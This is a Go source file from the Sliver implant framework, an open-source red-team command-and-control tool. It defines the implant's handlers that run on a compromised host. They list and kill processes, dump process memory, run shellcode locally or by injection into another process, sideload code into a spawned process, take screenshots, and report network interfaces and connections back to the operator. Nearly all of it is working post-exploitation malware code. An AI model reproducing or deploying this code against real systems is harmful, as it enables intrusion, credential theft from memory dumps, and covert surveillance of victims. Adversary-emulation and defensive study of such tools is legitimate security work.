// +build windows linux darwin

package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/netstat"
	"github.com/bishopfox/sliver/implant/sliver/procdump"
	"github.com/bishopfox/sliver/implant/sliver/ps"
	"github.com/bishopfox/sliver/implant/sliver/screen"
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"github.com/golang/protobuf/proto"
)

// ------------------------------------------------------------------------------------------
// These are generic handlers (as in calling convention) that use platform specific code
// ------------------------------------------------------------------------------------------

func psHandler(data []byte, resp RPCResponse) {
	psListReq := &sliverpb.PsReq{}
	err := proto.Unmarshal(data, psListReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	procs, err := ps.Processes()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to list procs %v", err)
		// {{end}}
	}

	psList := &sliverpb.Ps{
		Processes: []*commonpb.Process{},
	}

	for _, proc := range procs {
		psList.Processes = append(psList.Processes, &commonpb.Process{
			Pid:        int32(proc.Pid()),
			Ppid:       int32(proc.PPid()),
			Executable: proc.Executable(),
			Owner:      proc.Owner(),
		})
	}
	data, err = proto.Marshal(psList)
	resp(data, err)
}

func terminateHandler(data []byte, resp RPCResponse) {

	terminateReq := &sliverpb.TerminateReq{}
	err := proto.Unmarshal(data, terminateReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	var errStr string
	if int(terminateReq.Pid) <= 1 && !terminateReq.Force {
		errStr = "Cowardly refusing to terminate process without force"
	} else {
		err = ps.Kill(int(terminateReq.Pid))
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Failed to kill process %s", err)
			// {{end}}
			errStr = err.Error()
		}
	}

	data, err = proto.Marshal(&sliverpb.Terminate{
		Pid: terminateReq.Pid,
		Response: &commonpb.Response{
			Err: errStr,
		},
	})
	resp(data, err)
}

func dumpHandler(data []byte, resp RPCResponse) {
	procDumpReq := &sliverpb.ProcessDumpReq{}
	err := proto.Unmarshal(data, procDumpReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	res, err := procdump.DumpProcess(procDumpReq.Pid)
	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
	if err != nil {
		dumpResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}
	data, err = proto.Marshal(dumpResp)
	resp(data, err)
}

func taskHandler(data []byte, resp RPCResponse) {
	var err error
	task := &sliverpb.TaskReq{}
	err = proto.Unmarshal(data, task)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	if task.Pid == 0 {
		err = taskrunner.LocalTask(task.Data, task.RWXPages)
	} else {
		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
	}
	resp([]byte{}, err)
}

func sideloadHandler(data []byte, resp RPCResponse) {
	sideloadReq := &sliverpb.SideloadReq{}
	err := proto.Unmarshal(data, sideloadReq)
	if err != nil {
		return
	}
	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	sideloadResp := &sliverpb.Sideload{
		Result: result,
		Response: &commonpb.Response{
			Err: errStr,
		},
	}
	data, err = proto.Marshal(sideloadResp)
	resp(data, err)
}

func ifconfigHandler(_ []byte, resp RPCResponse) {
	interfaces := ifconfig()
	// {{if .Config.Debug}}
	log.Printf("network interfaces: %#v", interfaces)
	// {{end}}
	data, err := proto.Marshal(interfaces)
	resp(data, err)
}

func ifconfig() *sliverpb.Ifconfig {
	netInterfaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	interfaces := &sliverpb.Ifconfig{
		NetInterfaces: []*sliverpb.NetInterface{},
	}
	for _, iface := range netInterfaces {
		netIface := &sliverpb.NetInterface{
			Index: int32(iface.Index),
			Name:  iface.Name,
		}
		if iface.HardwareAddr != nil {
			netIface.MAC = iface.HardwareAddr.String()
		}
		addresses, err := iface.Addrs()
		if err == nil {
			for _, address := range addresses {
				netIface.IPAddresses = append(netIface.IPAddresses, address.String())
			}
		}
		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
	}
	return interfaces
}

func screenshotHandler(data []byte, resp RPCResponse) {
	sc := &sliverpb.Screenshot{}
	err := proto.Unmarshal(data, sc)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Screenshot Request")
	// {{end}}

	sc.Data = screen.Screenshot()
	data, err = proto.Marshal(sc)

	resp(data, err)
}

func netstatHandler(data []byte, resp RPCResponse) {
	netstatReq := &sliverpb.NetstatReq{}
	err := proto.Unmarshal(data, netstatReq)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		//{{end}}
		return
	}

	result := &sliverpb.Netstat{}
	entries := make([]*sliverpb.SockTabEntry, 0)

	if netstatReq.UDP {
		if netstatReq.IP4 {
			tabs, err := netstat.UDPSocks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp", tabs)...)
		}
		if netstatReq.IP6 {
			tabs, err := netstat.UDP6Socks(netstat.NoopFilter)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("udp6", tabs)...)
		}
	}

	if netstatReq.TCP {
		var fn netstat.AcceptFn
		switch {
		case netstatReq.Listening:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State == netstat.Listen
			}
		default:
			fn = func(s *netstat.SockTabEntry) bool {
				return s.State != netstat.Listen
			}
		}

		if netstatReq.IP4 {
			tabs, err := netstat.TCPSocks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp", tabs)...)
		}

		if netstatReq.IP6 {
			tabs, err := netstat.TCP6Socks(fn)
			if err != nil {
				//{{if .Config.Debug}}
				log.Printf("netstat failed: %v", err)
				//{{end}}
				return
			}
			entries = append(entries, buildEntries("tcp6", tabs)...)
		}
		result.Entries = entries
		data, err := proto.Marshal(result)
		resp(data, err)
	}
}

func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
	entries := make([]*sliverpb.SockTabEntry, 0)
	for _, e := range s {
		var (
			pid  int32
			exec string
		)
		if e.Process != nil {
			pid = int32(e.Process.Pid)
			exec = e.Process.Name
		}
		entries = append(entries, &sliverpb.SockTabEntry{
			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
				Ip:   e.LocalAddr.String(),
				Port: uint32(e.LocalAddr.Port),
			},
			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
				Ip:   e.RemoteAddr.String(),
				Port: uint32(e.RemoteAddr.Port),
			},
			SkState: e.State.String(),
			UID:     e.UID,
			Process: &commonpb.Process{
				Pid:        pid,
				Executable: exec,
			},
			Protocol: proto,
		})
	}
	return entries

}
